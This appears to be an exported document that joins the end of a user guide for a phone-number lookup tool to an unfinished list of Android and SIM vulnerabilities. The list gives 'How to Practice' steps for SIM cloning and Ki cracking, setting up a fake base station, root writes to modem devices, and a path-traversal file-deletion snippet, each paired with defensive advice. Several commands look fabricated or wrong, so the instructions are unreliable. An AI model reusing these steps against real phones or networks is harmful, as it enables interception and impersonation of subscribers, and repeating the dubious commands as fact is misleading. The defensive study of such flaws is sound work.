      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Open location in Google Maps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Save lookups to history</text:p>
      <text:p text:style-name="Preformatted_20_Text">![GUI Screenshot Placeholder]</text:p>
      <text:p text:style-name="Preformatted_20_Text">Note: The GUI requires tkinter (usually included with Python).</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">6. Testing with Different Number Types</text:p>
      <text:p text:style-name="Preformatted_20_Text">Tanzanian Mobile Numbers by Operator</text:p>
      <text:p text:style-name="Preformatted_20_Text">Operator<text:tab/>Prefixes<text:tab/>Example</text:p>
      <text:p text:style-name="Preformatted_20_Text">Vodacom<text:tab/>74, 75, 76<text:tab/>+255742345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">Airtel<text:tab/>68, 69, 78<text:tab/>+255782345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">tiGO<text:tab/>65, 67, 71, 77<text:tab/>+255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">halotel<text:tab/>61, 62<text:tab/>+255622345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">TTCL (fixed)<text:tab/>22, 24, 26, etc.<text:tab/>+255222345678</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Fixed-Line Numbers (with area codes)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># Dar es Salaam (area code 22)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255221234567</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Arusha (area code 27)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255271234567</text:p>
      <text:p text:style-name="Preformatted_20_Text">Invalid Number Test</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +25599999999</text:p>
      <text:p text:style-name="Preformatted_20_Text">Output will show ❌ TRACKING FAILED with an appropriate error message.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">7. Viewing Statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">To see how many lookups have been performed and cache status:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py --stats</text:p>
      <text:p text:style-name="Preformatted_20_Text">Example Output:</text:p>
      <text:p text:style-name="Preformatted_20_Text">📊 Tracker Statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">========================================</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cache Size: 15</text:p>
      <text:p text:style-name="Preformatted_20_Text">Offline Mode: False</text:p>
      <text:p text:style-name="Preformatted_20_Text">Total Requests Today: 23</text:p>
      <text:p text:style-name="Preformatted_20_Text">Unique Clients: 2</text:p>
      <text:p text:style-name="Preformatted_20_Text">Supported Countries: 52</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">8. Advanced: Using the Python API Directly</text:p>
      <text:p text:style-name="Preformatted_20_Text">You can also use the tracker programmatically in your own scripts:</text:p>
      <text:p text:style-name="Preformatted_20_Text">from complete_example import SecurePhoneTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Initialize tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">tracker = SecurePhoneTracker(offline_mode=False)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Track a number</text:p>
      <text:p text:style-name="Preformatted_20_Text">result = tracker.track_phone("+255712345678", client_id="my_script")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">if result['success']:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>data = result['data']</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Carrier: {data['carrier_name']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Location: {data['location']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text">else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Error: {result['error']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">9. Troubleshooting Common Issues</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 1: "ModuleNotFoundError: No module named 'phonenumbers'"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Ensure dependencies are installed:</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 2: Geocoding fails or times out</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: Nominatim API rate limiting. Fix: Use --offline mode or add a longer delay between requests.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 3: Numbers from certain countries show incorrect location</text:p>
      <text:p text:style-name="Preformatted_20_Text">Explanation: The library relies on prefix databases. For mobile numbers, it can only determine the country, not the city. This is by design.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 4: GUI won't open</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: tkinter not installed. Fix: Install Tkinter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"># On Debian/Ubuntu</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo apt-get install python3-tk</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># On Windows, reinstall Python with Tcl/Tk support</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 5: Rate limit exceeded</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Wait an hour or modify the rate limit in SecurePhoneTracker.__init__:</text:p>
      <text:p text:style-name="Preformatted_20_Text">self.rate_limit = 200 <text:s/># Increase from 100</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">10. Ethical and Legal Reminder</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Only track numbers you own or have explicit permission to investigate.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Respect privacy laws such as Tanzania's Personal Data Protection Act, 2022.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• This tool is for legitimate purposes like fraud prevention, emergency services, and personal security research.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Misuse for stalking or harassment is illegal and unethical.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Quick Reference Card</text:p>
      <text:p text:style-name="Preformatted_20_Text">Task<text:tab/>Command</text:p>
      <text:p text:style-name="Preformatted_20_Text">Track one number<text:tab/>python complete_example.py +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">Use offline mode<text:tab/>python complete_example.py +255712345678 --offline</text:p>
      <text:p text:style-name="Preformatted_20_Text">Batch process<text:tab/>python complete_example.py --batch numbers.json</text:p>
      <text:p text:style-name="Preformatted_20_Text">Launch GUI<text:tab/>python src/main.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">Show stats<text:tab/>python complete_example.py --stats</text:p>
      <text:p text:style-name="Preformatted_20_Text">Verbose logging<text:tab/>python complete_example.py +255712345678 --verbose</text:p>
      <text:p text:style-name="Preformatted_20_Text">Help<text:tab/>python complete_example.py -h</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Now you're ready to use J Phone NoTracker for your phone number intelligence needs. Start with simple lookups, explore the batch mode for bulk processing, and always use responsibly!</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P39"><text:span text:style-name="T9">Android &amp; SIM Card Vulnerabilities:</text:span> </text:p>
      <text:p text:style-name="P39">20+ Critical Examples for Security Experts</text:p>
      <text:p text:style-name="Preformatted_20_Text">As a senior security engineer, I've curated this comprehensive list of Android and SIM card vulnerabilities that represent the most significant threats in mobile security today. Each example includes detailed practice methodology and defensive strategies you can implement in your security assessments.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">SIM Card &amp; Baseband Vulnerabilities</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">1.</text:span> SIM Card Applet Vulnerabilities (Java Card Exploitation)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: SIM card applets (Java Card)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Modern SIM cards are essentially small computers running Java Card applets. These applets handle sensitive operations including cryptographic authentication with the mobile network. Researchers have discovered that vulnerabilities in these applets can allow attackers to execute arbitrary code on the SIM card itself, potentially compromising the device's network authentication credentials. The attack vector often involves malicious SMS messages containing specially crafted APDU (Application Protocol Data Unit) commands that exploit memory corruption in the Java Card Virtual Machine.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Acquire a programmable Java Card (like the J3A040 or J3H080) and a smart card reader (e.g., ACR122U or SCL010)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Install the Java Card Development Kit and GlobalPlatformPro tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Decompile existing SIM applets using tools like JCAnalyzer</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Use fuzzing frameworks like JCAlgTest to send malformed APDUs</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Monitor for unexpected behavior using a logic analyzer between the card reader and card</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27"># Install GlobalPlatformPro</text:p>
      <text:p text:style-name="P27">sudo apt install -y gp</text:p>
      <text:p text:style-name="P27"># Send APDU command to card</text:p>
      <text:p text:style-name="P27">gp --apdu 00A4040008A000000003000000</text:p>
      <text:p text:style-name="P27"># Monitor card responses</text:p>
      <text:p text:style-name="P27">gp –info</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement proper input validation in all Java Card applet code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use secure coding practices including bounds checking on all arrays</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Java Card firewall features to isolate applets</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Regularly audit SIM applet code through formal verification methods</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply carrier-issued security patches promptly</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">2.</text:span> SIM Cloning via COMP128 Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T10">Affected Component</text:span>: SIM card authentication algorithm (COMP128)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: The COMP128 algorithm used in GSM authentication has known cryptographic weaknesses. The COMP128-1 variant, still supported in many legacy systems, has a critical vulnerability that allows an attacker within range of a target device to recover the Ki (authentication key) by capturing several authentication challenges and responses. With physical access to the SIM card, researchers have demonstrated key extraction in under 8 hours using side-channel analysis.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Obtain an old GSM SIM card (pre-2010) and a SIM card reader/writer</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use open-source tools like simclone or sim-tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Capture authentication challenges using a software-defined radio (HackRF or USRP)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Launch cryptographic attacks using specialized software</text:p>
      <text:p text:style-name="P27"># Clone a SIM using sim-tools</text:p>
      <text:p text:style-name="P27">git clone https://github.com/osmocom/sim-tools.git</text:p>
      <text:p text:style-name="P27">cd sim-tools</text:p>
      <text:p text:style-name="P27">./sim_read.py /dev/ttyUSB0</text:p>
      <text:p text:style-name="P27"># Extract Ki using known vulnerabilities</text:p>
      <text:p text:style-name="P27">./crack_comp128 captured_data.bin</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Upgrade to COMP128-3 or AES-based authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use SIM cards manufactured after 2012 which generally use stronger algorithms</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable 3G/4G authentication which uses stronger algorithms</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Replace legacy SIM cards with newer UICC cards supporting modern crypto</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">3.</text:span> IMSI Catchers (Stingrays) and False Base Stations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T11">Affected Component:</text:span> Mobile network authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: IMSI catchers exploit the lack of mutual authentication in 2G networks. These devices impersonate legitimate cell towers, forcing nearby phones to connect and reveal their International Mobile Subscriber Identity (IMSI). Advanced versions can intercept calls and SMS messages by downgrading connections to 2G where encryption is weak or non-existent. The technology is widely available commercially and has been documented in numerous law enforcement and espionage cases.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up a software-defined radio environment using BladeRF or USRP</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Install YateBTS or OpenBTS for creating a fake base station</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Use Wireshark with GSM decoding to analyze captured traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Deploy a testing environment in a Faraday cage to avoid interfering with legitimate networks</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27"># Install YateBTS</text:p>
      <text:p text:style-name="P27">git clone https://github.com/yatebts/yatebts.git</text:p>
      <text:p text:style-name="P27">cd yatebts</text:p>
      <text:p text:style-name="P27">./configure &amp;&amp; make &amp;&amp; sudo make install</text:p>
      <text:p text:style-name="P27"># Configure fake BTS</text:p>
      <text:p text:style-name="P27">sudo nano /etc/yate/subscribers.conf</text:p>
      <text:p text:style-name="P27"># Start the fake base station</text:p>
      <text:p text:style-name="P27">sudo yate -s</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>D<text:span text:style-name="T2">efense:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable 2G on your device if not needed (Android: Settings → Network &amp; Internet → Mobile network → Preferred network type → LTE only)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use apps like SnoopSnitch or IMSI-Catcher Catcher that detect suspicious base station behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable "LTE only" mode to prevent downgrade attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted messaging apps (Signal, WhatsApp) rather than SMS for sensitive communication</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">4.</text:span> <text:span text:style-name="T10">SIM Swap Attacks via Social Engineering</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T8">Affected Component</text:span>: Carrier account management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: SIM swapping represents one of the most financially devastating mobile attacks. Attackers gather personal information about targets through OSINT, then contact mobile carriers pretending to be the victim. They convince support representatives to activate a new SIM card under the attacker's control. Once successful, all calls and SMS, including two-factor authentication codes, route to the attacker's device. This has led to cryptocurrency thefts and account takeovers worth millions.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up a controlled test with a spare phone number and carrier account</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Practice OSINT gathering on yourself (use your own information)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Document the carrier's account recovery process</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test carrier security by attempting to simulate the attack on your own account (with carrier's permission)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Set up a PIN or password on your carrier account</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable "port-out protection" or "number lock" features</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use authenticator apps (Google Authenticator, Authy) instead of SMS for 2FA</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using a VoIP number for less critical accounts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Regularly audit your carrier account for suspicious activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">5.</text:span> Samsung Carrier Relock Bypass (CVE-2026-20974)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Samsung devices with network restrictions</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: This vulnerability allows physical attackers to bypass carrier relock mechanisms on Samsung devices . With a CVSS score of 5.2 (Medium), it enables attackers to unlock devices to use with unauthorized carriers. The flaw exists in improper input validation in data related to network restrictions prior to SMR Jan-2026 Release 1. Physical access to the device is required, making it particularly relevant for device resellers and forensic examiners.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Obtain a carrier-locked Samsung device with vulnerable firmware</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Research specific exploitation methods (limited public information)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Practice in controlled environment with proper authorization</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Document device behavior before and after attempted exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Samsung security updates (SMR Jan-2026 or later)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong device encryption and screen locks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable remote wipe capabilities via Find My Mobile</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using device management solutions for corporate devices</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">6.</text:span> <text:span text:style-name="T2">Qualcomm Baseband QMI Vulnerability (CVE-2020-11292)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Affected Component:</text:span> Qualcomm MSM Interface (QMI) in baseband chips</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: This critical vulnerability affects the Qualcomm baseband chip present in approximately 40% of smartphones globally, including devices from Samsung, LG, Google, OnePlus, and Xiaomi . The flaw exists in the QMI (Qualcomm MSM Interface) protocol used for communication between the application processor and baseband. Attackers can exploit this through malicious apps installed on the device (even without special permissions) to inject code into the QuRT (Qualcomm Real-Time <text:soft-page-break/>Operating System). Successful exploitation allows attackers to access SMS and call history, intercept voice calls, and potentially crack SIM security. The vulnerability affects even high-end chips like Snapdragon 888 and 870.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up a testing environment with a vulnerable Qualcomm device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Install Android debugging tools and custom recovery</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Use fuzzing frameworks to test QMI interfaces</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor baseband behavior using specialized debugging hardware</text:p>
      <text:p text:style-name="P27"># Access modem diagnostics (requires root)</text:p>
      <text:p text:style-name="P27">adb shell</text:p>
      <text:p text:style-name="P27">su</text:p>
      <text:p text:style-name="P27">echo "AT+QMI" &gt; /dev/smd0</text:p>
      <text:p text:style-name="P27">cat /dev/smd0</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply security patches (available since December 2020)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Install apps only from trusted sources (Google Play Store)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use mobile security solutions that detect anomalous behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider devices with extended security update commitments</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">7. Baseband Firmware Modification (Shadow SIM Attack)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Baseband processor firmware</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Research presented at BruCON demonstrated techniques for modifying baseband firmware to create "Shadow SIMs" - virtual SIM cards that operate alongside legitimate SIMs without user knowledge . This attack allows attackers to forward authentication vectors and effectively use the device's cellular connectivity for their purposes. The attack leverages the fact that the baseband processor runs separate firmware with its own memory space, often isolated from the main Android OS security controls. Attackers can access the SIM card from the application processor using AT commands, particularly the AT+CSIM command which sends APDUs directly to the SIM.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Extract baseband firmware from device using tools like QPST or proprietary tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Analyze firmware using binwalk, IDA Pro, or Ghidra</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Identify communication channels between AP and baseband</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Practice modifying firmware in isolated environment</text:p>
      <text:p text:style-name="P27"># Extract baseband firmware</text:p>
      <text:p text:style-name="P27">sudo modprobe qcserial</text:p>
      <text:p text:style-name="P27">sudo minicom -D /dev/ttyUSB0</text:p>
      <text:p text:style-name="P27"># Send AT commands</text:p>
      <text:p text:style-name="P27">AT+CSIM=10,"00A4040008A000000003000000"</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep baseband firmware updated through OEM updates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement hardware-level isolation between AP and baseband</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use devices with verified boot and secure boot chains</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unusual baseband communication patterns</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using devices with open-source baseband implementations (limited options)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P37">Android OS Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">8.</text:span> MMS Provider Path Traversal (CVE-2025-48609)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android's MmsProvider.java</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: This vulnerability allows arbitrary file deletion affecting telephony, SMS, and MMS functionalities through a path traversal error . The flaw exists in multiple functions of MmsProvider.java, where insufficient validation of file paths enables attackers to traverse directories and delete files they <text:soft-page-break/>shouldn't have access to. Critically, this can be exploited without any additional execution privileges, and user interaction is not required. This could lead to denial of service or disruption of critical system functions.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up Android emulator with vulnerable version (specific versions not yet published)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Create a test app that interacts with Content Providers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Craft malicious URIs with path traversal sequences</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor file system changes and app behavior</text:p>
      <text:p text:style-name="P27">// Example test code for path traversal</text:p>
      <text:p text:style-name="P27">ContentResolver resolver = getContentResolver();</text:p>
      <text:p text:style-name="P27">Uri uri = Uri.parse("content://mms-sms/threads/../../../data/data/com.example.app/databases");</text:p>
      <text:p text:style-name="P27">resolver.delete(uri, null, null);</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Android security updates as they become available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Scoped Storage model (Android 10+)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement proper input validation in custom ContentProviders</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Run apps in isolated process sandboxes</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious file access patterns</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">9. Android 17 Beta Automatic SIM PIN Feature (Security vs. Convenience)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T4">Affected Component</text:span>: Android OS SIM management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Android 17 Beta 2 introduces "automatic SIM lock protection" that stores SIM PINs securely and automatically submits them after reboot . While designed to improve user experience and encourage SIM PIN adoption, this feature introduces a new attack surface. If an attacker gains access to the device after boot (bypassing lock screen), the system automatically unlocks the SIM without additional authentication. The feature is currently in testing for Pixel devices .</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Install Android 17 Beta on a test Pixel device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enable the automatic SIM PIN feature</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Attempt to access SIM functions after various lock states</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Analyze how the PIN is stored and protected</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong device lock screen (biometric + PIN/password)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider keeping manual SIM PIN entry for high-security scenarios</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable full disk encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use remote wipe capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unauthorized SIM access attempts</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">10. Android Debug Bridge (ADB) Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: ADB interface</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: ADB is a powerful debugging tool that, when enabled, provides extensive access to the device. Attackers can exploit ADB when users leave it enabled unintentionally or when connected to untrusted computers. Physical access with ADB enabled allows full filesystem access, app installation, and command execution. ADB over network (port 5555) is particularly dangerous as it allows remote attacks if enabled.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Enable Developer Options and USB Debugging on test device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use ADB commands to explore device access</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Attempt to install apps and access data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test ADB over network (adb connect)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
